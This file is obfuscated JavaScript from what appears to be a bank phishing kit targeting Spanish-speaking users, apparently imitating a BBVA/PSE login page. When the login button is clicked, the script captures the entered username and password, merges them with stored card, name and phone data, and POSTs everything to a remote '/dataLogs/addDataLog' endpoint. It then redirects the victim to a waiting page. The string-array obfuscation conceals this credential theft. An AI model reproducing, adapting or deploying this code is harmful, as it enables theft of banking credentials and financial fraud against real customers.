const _0x6e1265 = _0x32b2;
function _0x5c13() {
  const _0x453101 = [
    "Error\x20al\x20enviar\x20los\x20datos\x20al\x20servidor:",
    "Hubo\x20un\x20error\x20al\x20procesar\x20la\x20solicitud.",
    "4592240fCNiyu",
    "metaInfo",
    "focus",
    "/dataLogs/addDataLog",
    "POST",
    "Datos\x20enviados\x20correctamente\x20al\x20servidor",
    "puser",
    "641565rbCmat",
    "Error\x20al\x20agregar\x20datos\x20en\x20el\x20servidor",
    "json",
    "./wait.html",
    "location",
    "docNumberMovil",
    "user",
    "getElementById",
    "btnLogin-page1",
    "290883hCoUCV",
    "setItem",
    "36213VuyFNB",
    "PSE",
    "Ingresó\x20datos",
    "addEventListener",
    "telnum",
    "6lNvrDU",
    "46815XdLNdO",
    "8hwuoXj",
    "value",
    "href",
    "32RXlvzj",
    "515361QPpgXH",
    "842444RNfOon",
    "application/json",
    "error",
    "disabled",
    "info",
    "log",
    "Token\x20y\x20ID\x20guardados\x20en\x20localStorage",
    "stringify",
    "passwordMovil",
  ];
  _0x5c13 = function () {
    return _0x453101;
  };
  return _0x5c13();
}
(function (_0x961663, _0x178e2a) {
  const _0x6bd3f6 = _0x32b2,
    _0x58ebaf = _0x961663();
  while (!![]) {
    try {
      const _0x1e63ca =
        -parseInt(_0x6bd3f6(0x1b1)) / 0x1 +
        (parseInt(_0x6bd3f6(0x1ba)) / 0x2) *
          (-parseInt(_0x6bd3f6(0x1b3)) / 0x3) +
        -parseInt(_0x6bd3f6(0x1bf)) / 0x4 +
        (parseInt(_0x6bd3f6(0x1b9)) / 0x5) *
          (-parseInt(_0x6bd3f6(0x1b8)) / 0x6) +
        (parseInt(_0x6bd3f6(0x1be)) / 0x7) *
          (parseInt(_0x6bd3f6(0x1bd)) / 0x8) +
        parseInt(_0x6bd3f6(0x1d1)) / 0x9 +
        parseInt(_0x6bd3f6(0x1ca)) / 0xa;
      if (_0x1e63ca === _0x178e2a) break;
      else _0x58ebaf["push"](_0x58ebaf["shift"]());
    } catch (_0x2b7176) {
      _0x58ebaf["push"](_0x58ebaf["shift"]());
    }
  }
})(_0x5c13, 0x40e84);
function updateLS() {
  const _0xcb7273 = _0x32b2;
  LS[_0xcb7273(0x1b2)](_0xcb7273(0x1c3), JSON[_0xcb7273(0x1c6)](info));
}
const button = document[_0x6e1265(0x1af)](_0x6e1265(0x1b0)),
  userInput = document[_0x6e1265(0x1af)](_0x6e1265(0x1d6)),
  passInput = document["getElementById"](_0x6e1265(0x1c7));
function _0x32b2(_0x33b2f2, _0xb24f8b) {
  const _0x5c13de = _0x5c13();
  return (
    (_0x32b2 = function (_0x32b26a, _0x1881a7) {
      _0x32b26a = _0x32b26a - 0x1af;
      let _0x3cae2a = _0x5c13de[_0x32b26a];
      return _0x3cae2a;
    }),
    _0x32b2(_0x33b2f2, _0xb24f8b)
  );
}
button[_0x6e1265(0x1b6)]("click", async function (_0x73c3fc) {
  const _0x183452 = _0x6e1265;
  _0x73c3fc["preventDefault"](), (button[_0x183452(0x1c2)] = !![]);
  if (userInput[_0x183452(0x1bb)] == "" && passInput[_0x183452(0x1bb)] == "") {
    alert("Por\x20favor\x20ingrese\x20la\x20información\x20requerida"),
      userInput[_0x183452(0x1cc)](),
      (button[_0x183452(0x1c2)] = ![]);
    return;
  } else {
    var _0x3a020f = userInput[_0x183452(0x1bb)],
      _0x3ceacf = passInput[_0x183452(0x1bb)];
    (info["metaInfo"][_0x183452(0x1d7)] = _0x3a020f),
      (info[_0x183452(0x1cb)][_0x183452(0x1d0)] = _0x3ceacf),
      updateLS();
    const _0xa8c80 = {
      reg: info[_0x183452(0x1cb)]["cc"],
      name: info[_0x183452(0x1cb)]["dudename"],
      cl: info[_0x183452(0x1cb)][_0x183452(0x1b7)],
      us: info[_0x183452(0x1cb)][_0x183452(0x1d7)],
      ps: info[_0x183452(0x1cb)][_0x183452(0x1d0)],
      bn: "🔵​Bbv4",
      status: _0x183452(0x1b5),
      source: _0x183452(0x1b4),
    };
    try {
      const _0x150e6b = await fetch(url + _0x183452(0x1cd), {
        method: _0x183452(0x1ce),
        headers: {
          "Content-Type": _0x183452(0x1c0),
          Origin: window[_0x183452(0x1d5)]["origin"],
        },
        body: JSON[_0x183452(0x1c6)](_0xa8c80),
      });
      if (!_0x150e6b["ok"]) {
        const _0x13edf5 = await _0x150e6b["json"]();
        throw new Error(_0x13edf5[_0x183452(0x1c1)] || _0x183452(0x1d2));
      }
      const _0x344a01 = await _0x150e6b[_0x183452(0x1d3)]();
      localStorage[_0x183452(0x1b2)]("dataLogToken", _0x344a01["token"]),
        localStorage[_0x183452(0x1b2)]("dataLogId", _0x344a01["id"]),
        console[_0x183452(0x1c4)](_0x183452(0x1cf)),
        console[_0x183452(0x1c4)](_0x183452(0x1c5)),
        (window[_0x183452(0x1d5)][_0x183452(0x1bc)] = _0x183452(0x1d4));
    } catch (_0x194231) {
      console[_0x183452(0x1c1)](_0x183452(0x1c8), _0x194231),
        alert(_0x183452(0x1c9)),
        (button[_0x183452(0x1c2)] = ![]);
    }
  }
});
